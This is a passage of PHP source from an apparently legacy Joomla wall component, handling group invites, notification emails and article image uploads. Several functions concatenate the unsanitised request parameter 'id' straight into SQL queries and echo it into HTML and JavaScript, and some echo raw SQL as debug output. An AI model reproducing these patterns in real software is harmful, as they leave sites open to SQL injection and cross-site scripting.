		$sql = 'INSERT INTO #__awd_groups_members (group_id, user_id, status, created_date) VALUES("' . $groupId . '","' . $memberId . '", 2, "' . time() . '")';
		$db->setQuery($sql);
		$db->query();
		// get group name
		$db 	= &JFactory::getDBO();	
		$query 	= 'SELECT title FROM #__awd_groups '					
				 .'WHERE id = ' . (int)$groupId
				 ;
		$db->setQuery($query);
		$groupTitle = $db->loadResult();
		//insert into awd_wall_notification table.
		$user = &JFactory::getUser();
		$ndate=date("Y-m-d H:i:s");
		$query = 'INSERT INTO #__awd_wall_notification(ndate, nuser, ncreator, ntype, nwallid, ngroupid, nphotoid, nalbumid, nread) VALUES( "'.$ndate.'" , "' . $memberId . '", "' . $user->id . '", "group", "", "' . $groupId . '"," ", "","0")';
		$db->setQuery($query);
		$db->query();
		// send email 
$itemId = AwdwallHelperUser::getComItemId();
$wuser = &JFactory::getUser($memberId);
$rName =  AwdwallHelperUser::getDisplayName($memberId);
$sName =  AwdwallHelperUser::getDisplayName($user->id);
$reciverurl=JURI::base().'index.php?option=com_awdwall&view=awdwall&layout=mywall&Itemid='.$itemId;	
$query 	= 'SELECT title FROM #__awd_groups WHERE id = ' . (int)$groupId;
$db->setQuery($query);
$grpname = $db->loadResult();
$grplink=JURI::base().'index.php?option=com_awdwall&task=viewgroup&groupid='.$groupId.'&Itemid='.$itemId ;
$sitename=$mainframe->getCfg('fromname');
$siteaddress=JURI::base();
$useravatarimage=AwdwallHelperUser::getBigAvatar51($user->id);
$emailgreeting=JText::sprintf('COM_COMAWDWALL_EMAIL_GREETING', $rName);
$emailbody=JText::sprintf('COM_COMAWDWALL_EMAIL_BODY_INVITE_MEMBER',$sName,$grpname);	
$emailtext1=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_VIEW_CONVERSATION');	
$emailtext2=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_SEE_POST');
$emailfooter=JText::sprintf('COM_COMAWDWALL_EMAIL_FOOTER',$siteaddress,$sitename);	

$emailcontent='<table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="font-size:16px;font-family:lucida grande,tahoma,verdana,arial,sans-serif;background:#313131;color:#ffffff;font-weight:bold;vertical-align:baseline;letter-spacing:-0.03em;text-align:left;padding:10px 38px 4px"><a target="_blank" href="'.$siteaddress.'" style="text-decoration:none" title="'.$siteaddress.'"><span style="background:#313131;color:#ffffff;font-weight:bold;font-family:lucida grande,tahoma,verdana,arial,sans-serif;vertical-align:middle;font-size:16px;letter-spacing:-0.03em;text-align:left;vertical-align:baseline"><span class="il">'.$sitename.'</span></span></a></td></tr></tbody></table><table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="border-right:1px solid #ccc;color:#333333;font-size:11px;border-bottom:1px solid #ccc;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;border-top:1px solid #ccc;padding:10px 25px;border-left:1px solid #ccc; background-color:#f7f7f7"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:10px 25px;color:#333333;width:620px"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding-bottom:10px"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td colspan="2" valign="top" style="height:30px;"><span style="font-size:13px;">'.$emailgreeting.'</span></td></tr><tr><td valign="top" style="width:100%;"><span style="font-size:13px">'.$emailbody.'</span></td><td valign="top" style="padding-right:10px;font-size:0px"><a target="_blank" style="color:#3b5998;text-decoration:none" href="'.$reciverurl.'" title="'.$sName.'"><img style="border:0" src="'.$useravatarimage.'"  /></a></td></tr></tbody></table></td></tr><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif"><table cellspacing="0" cellpadding="0" border="0" style="border-collapse:collapse;width:100%"><tbody><tr><td>&nbsp;</td></tr><tr><td style="font-size:13px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0px;border-left:none;border-right:none;">'.$emailfooter.'</td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>';
				$body = $emailcontent;				 
		$mailer = & JFactory::getMailer();
		$mailer->setSender(array($mainframe->getCfg('mailfrom'), $mainframe->getCfg('fromname')));
		$mailer->setSubject(JText::sprintf('EMAIL INVITE MEMBER SUBJECT', $sName, $groupTitle));
		$mailer->setBody($body);
		$mailer->IsHTML(1);
		$mailer->addRecipient($wuser->email);
		$rs = $mailer->Send();		
		echo JText::_('Invited');
		exit;
	}
	
	function acceptInvite()
	{
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
		$groupId = JRequest::getInt('groupid', 0);
		$userId  = JRequest::getInt('userid', 0);
		$itemId = AwdwallHelperUser::getComItemId();
		$user = &JFactory::getUser();
		$db  =& JFactory::getDBO();
		if($groupId){
		$sql = 'UPDATE #__awd_groups_members SET status = 1 WHERE user_id = ' . (int)$userId . ' AND group_id = ' . (int)$groupId;
		$db->setQuery($sql);echo $sql;
		$db->query();
		// add message to news feeds 
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'group.php');
		$groupModel = new AwdwallModelGroup();
		$grpInfo = $groupModel->getGroupInfo($groupId);
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');	
		$wall 				=& JTable::getInstance('Wall', 'Table');						
		$wall->user_id		= $grpInfo->creator;
		$wall->group_id		= $grpInfo->id;
		$wall->type			= 'group';
		$wall->commenter_id	= $userId;
		$wall->user_name	= '';
		$wall->avatar		= '';
		$wall->message		= '';
		$wall->reply		= 0;
		$wall->is_read		= 0;
		$wall->is_pm		= 0;
		$wall->is_reply		= 0;
		$wall->posted_id	= NULL;
		$wall->wall_date	= time();
		// store wall to database
		if (!$wall->store()){				
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
		}
		//get creator of group
		$query = "SELECT creator FROM #__awd_groups WHERE id =".$groupId;
		$db->setQuery($query);
		$creator = $db->loadResult();
		//insert into awd_wall_notification table.
		
		$ndate=date("Y-m-d H:i:s");
		$query = 'INSERT INTO #__awd_wall_notification(ndate, nuser, ncreator, ntype, nwallid, ngroupid, nphotoid, nalbumid, nread) VALUES( "'.$ndate.'" , "' . $creator . '", "' . $userId . '", "group", "'.$wall->id.'", "'.$groupId.'"," ", "","0")';
		$db->setQuery($query);
		$db->query();
		}
		exit;
	}
	
	function denyInvite()
	{
		$groupId = JRequest::getInt('groupid', 0);
		$userId  = JRequest::getInt('userid', 0);
		$user = &JFactory::getUser();
		$db =& JFactory::getDBO();
		$sql = 'DELETE FROM #__awd_groups_members WHERE user_id = ' . (int)$userId . ' AND group_id = ' . (int)$groupId;
		$db->setQuery($sql);echo $sql;
		$db->query();
		
		exit;
	}
	
	function deleteGrpMember()
	{
		$groupId = JRequest::getInt('groupid', null);
		$userId = JRequest::getInt('userid', null);
	
		$db =& JFactory::getDBO();
		$sql = 'DELETE FROM #__awd_groups_members WHERE user_id = ' . (int)$userId . ' AND group_id = ' . (int)$groupId;
		$db->setQuery($sql);
		$db->query();
		
		exit;
	}
function uploadarticleimage()
{
	$db =& JFactory::getDBO();
	
	$itemId = AwdwallHelperUser::getComItemId();
	
	$id=$_REQUEST['id'];
	$user = &JFactory::getUser();
		$query = "SELECT image,commenter_id,user_id FROM #__awd_wall_article as ar inner join #__awd_wall as aw on ar.wall_id =aw.id  WHERE `article_id`=".$id."  limit 1";
		$db->setQuery($query);
		$articlerows = $db->loadObjectList();
		$articlerow=$articlerows[0];
		if($articlerow->commenter_id)
		{
			$wuid=$articlerow->commenter_id;
		}
		else
		{
			$wuid=$user->id;
		}	
		
		
	$config 		= &JComponentHelper::getParams('com_awdwall');
	$article_img_height 		= $config->get('article_img_height', '84');
	$article_img_width 		= $config->get('article_img_width', '112');
	$image 	= JRequest::getVar('awd_link_image', null, 'files', 'array');
	$arrExt 	= explode(',', AwdwallHelperUser::getImageExt());
	$article_image 	= JRequest::getVar('awd_article_image', null, 'files', 'array');
		if($article_image['name'] != ''){
		jimport('joomla.filesystem.file');
		jimport('joomla.filesystem.folder');
		$time = time();
		//Clean up filename to get rid of strange characters like spaces etc
		$fileName = $time . '_' . JFile::makeSafe($article_image['name']);
		$fileName = str_replace(' ', '_', $fileName);
		$src 	= $article_image['tmp_name'];
		$dest 	= 'images' . DS . 'awd_articles' . DS . $wuid . DS . 'original' . DS . $fileName; 
		if(in_array(strtolower(JFile::getExt($fileName)), $arrExt)){
			if (JFile::upload($src, $dest)){ 
				require_once(JPATH_COMPONENT . DS . 'libraries' . DS . 'thumbnail.php');
				$thumb = new Thumbnail($dest);
				$thumb->resize($article_img_width, $article_img_height);
				JFolder::create('images' . DS . 'awd_articles' . DS . $wuid . DS . 'thumb');
				$thumb->save('images' . DS . 'awd_articles' . DS . $wuid . DS . 'thumb' . DS . $fileName);
				// resize original picture to 600*400
				$thumb = new Thumbnail($dest);
				$thumb->resize(600, 400);					
				$thumb->save($dest);
				$query = "update #__awd_wall_article set image='".$fileName."' where  `article_id`=".$id;
				$db->setQuery($query);
				if (!$db->query()){	
					$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId,false),$db->getErrorMsg());
				}
				
			}else {						
				//Redirect and throw an error message
				//$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=mywall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
			}
		}
	}
	if($articlerow->image)
	{
		unlink('images' . DS . 'awd_articles' . DS . $wuid . DS . 'original' . DS . $articlerow->image);
		unlink('images' . DS . 'awd_articles' . DS . $wuid . DS . 'thumb' . DS . $articlerow->image);
	}
	
	$imagesrc=JURI::base().'images/awd_articles/'. $wuid . '/original/'. $fileName;
	echo '{"imagesrc": "'.$imagesrc.'"}';
	//echo '<img src="'.$imagesrc.'" width="150" />';
	exit;
}	
	
function removeartimage()
{
	$db =& JFactory::getDBO();
	
	$itemId = AwdwallHelperUser::getComItemId();
	
	$id=$_REQUEST['id'];
	$user = &JFactory::getUser();
	$query = "SELECT image,commenter_id,user_id FROM #__awd_wall_article as ar inner join #__awd_wall as aw on ar.wall_id =aw.id  WHERE `article_id`=".$id."  limit 1";
		
		$db->setQuery($query);
		$articlerows = $db->loadObjectList();
		$articlerow=$articlerows[0];
		
		if($articlerow->commenter_id)
		{
			$wuid=$articlerow->commenter_id;
		}
		else
		{
			$wuid=$user->id;
		}	
		
		$query = "update #__awd_wall_article set image='' where  `article_id`=".$id;
		$db->setQuery($query);
		if (!$db->query()){	
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId,false),$db->getErrorMsg());
		}
		if($articlerow->image)
		{
			unlink('images' . DS . 'awd_articles' . DS . $wuid . DS . 'original' . DS . $articlerow->image);
			unlink('images' . DS . 'awd_articles' . DS . $wuid . DS . 'thumb' . DS . $articlerow->image);
		}
		
	$imagesrc=JURI::base().'plugins/editors-xtd/awdarticleimage_editor/awdarticleimage_editor/no_bio_image.gif';
	//echo '{"imagesrc": "'.$imagesrc.'"}';
	echo '<img src="'.$imagesrc.'" width="150" id="artthumb" />';
	exit;
}
	
function articleimageuploader()
{
	$db =& JFactory::getDBO();
	$id=$_REQUEST['id'];
	$user = &JFactory::getUser();
	$query = "SELECT image,commenter_id,user_id FROM #__awd_wall_article as ar inner join #__awd_wall as aw on ar.wall_id =aw.id  WHERE `article_id`=".$id."  limit 1";
		
		$db->setQuery($query);
		$articlerows = $db->loadObjectList();
		$articlerow=$articlerows[0];
	?>
<script type="text/javascript" src="<?php echo JURI::base();?>components/com_awdwall/js/jquery-1.4.2.min.js"></script>
<script type="text/javascript">jQuery.noConflict();var siteUrl = '<?php echo JURI::base();?>';</script>
<script type="text/javascript" src="<?php echo JURI::base();?>plugins/editors-xtd/awdarticleimage_editor/awdarticleimage_editor/ajaxupload.js"></script>
	
<script type="text/javascript">
function uploadarticleimage(id)
{
	
	var ext = jQuery('#awd_article_image').val().split('.').pop().toLowerCase();
	if(jQuery.inArray(ext, ['gif','png','jpg','jpeg']) == -1) {
		alert('<?php echo JText::_('invalid image file');?>');
		return false;
	}
	
	
	postUrl="index.php?option=com_awdwall&tmpl=component&task=uploadarticleimage&id="+id;
	jQuery("#uploadartimage").attr('disabled', 'disabled');
	jQuery("#uploadartimage").attr('value', 'Loading....');
	jQuery.ajaxFileUpload
	(
		{
			url:postUrl,
			secureuri:false,
			fileElementId:'awd_article_image',
			fileTitle:'articleimage',
			fileDesc:'articleimage',
			dataType: 'json',
			success: function (data, status)
			{	
				jQuery('#artthumb').attr('src', data.imagesrc);
				jQuery("#uploadartimage").removeAttr('disabled');
				jQuery("#uploadartimage").attr('value', 'Upload');
				jQuery("#awd_article_image").attr('value', '');
			},
			error: function (data, status, e)
			{
			 	//alert(e);
			}
		}
	)
return false;
}
function removearticleimage(id)
{
	var url='index.php?option=com_awdwall&task=removeartimage&id='+id;
	jQuery.post(url, 
	function(data)
	{
		document.getElementById("artimagetd").innerHTML=data;
	}
	, "html");
return false;
}
</script>	
<style>
.error { color:#FF0000; }
.errordiv { float:left;padding:10px; margin:10px; border: 1px solid #555555;color: #000000;background-color: #f8f8f8; text-align:center; width:430px; }
table,td,th{
border:0px;
}
</style>
<div class="errordiv">
	<div style="float:left; width:200px; padding:5px;">
		<table width="100%" border="0" cellspacing="0" cellpadding="0">
		  <tr>
			<td align="left" valign="top" id="artimagetd">
			<?php if($articlerow->image){?>
			<img src="images/awd_articles/<?php echo $articlerow->commenter_id;?>/original/<?php echo $articlerow->image;?>" width="150" id="artthumb"/>
			<?php }else{?>
			<img src="plugins/editors-xtd/awdarticleimage_editor/awdarticleimage_editor/no_bio_image.gif" width="150" id="artthumb" />
			<?php } ?>
			</td>
			<td align="left" valign="top"><a href="#" onclick="return removearticleimage(<?php echo $id;?>)" ><img src="plugins/editors-xtd/awdarticleimage_editor/awdarticleimage_editor/awdartdelete.png" width="32"  /></a></td>
		  </tr>
		</table>
	</div>
	
	<div style="float:right; width:200px; padding:5px;" id="brosweimage">
	<form action="" method="get">
	<input name="awd_article_image" id="awd_article_image" type="file" size="15" />
	<input name="uploadartimage" id="uploadartimage" type="button" value="<?php echo JText::_('Upload');?>" onclick="return uploadarticleimage(<?php echo $id;?>)" />
	<input type="hidden"  name="id" id="id" value="<?php echo $id;?>" />
	</form>
	</div>
</div>
	<?php
}
}
function processthumb(&$handle,$filename,$folder)
{
   
   $mainframe= JFactory::getApplication(); 
	$handle->file_new_name_body   = $filename;
	$handle->process($folder);
   if ($handle->processed) {
	  // echo 'image resized';
	   //$handle->clean();
   } else {
   
   		//$mainframe->Redirect(JRoute::_('index.php?option=com_awdwall&task=uploadavatar&Itemid=' . $itemId, false));
	   //echo 'error : ' . $handle->error;
   }
}
?>